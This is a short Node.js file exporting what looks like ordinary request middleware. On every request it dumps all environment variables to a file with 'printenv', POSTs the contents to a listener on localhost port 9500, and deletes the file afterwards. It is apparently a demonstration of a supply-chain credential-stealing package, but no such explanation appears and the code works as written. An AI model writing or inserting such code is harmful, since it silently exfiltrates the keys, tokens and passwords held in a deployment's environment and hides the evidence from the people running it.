  const http = require('http');
  const exec = require('child_process').exec;
  const fs = require('fs');
  const path = require("path");

  module.exports = () => {

    return (req, res, next) => {
      exec('printenv >> fake-logfile.txt', (err, stdout, stderr) => {
        if (err) {
          // node couldn't execute the command
          return;
        }
        const file = fs.readFileSync(path.resolve(__dirname, "./fake-logfile.txt"));

        const post_options = {
          host: 'localhost',
          port: '9500',
          path: '/',
          method: 'POST'
        };
        var post_req = http.request(post_options, function (res) {
          res.setEncoding('utf8');
          res.on('data', function (chunk) {
            console.log('Response: ' + chunk);
          });
        });
  
        // post the data
        post_req.write(file);
        post_req.end();

        // Drop file after send it
        exec('rm ./fake-logfile.txt');
      
      });

      next();
    };
  };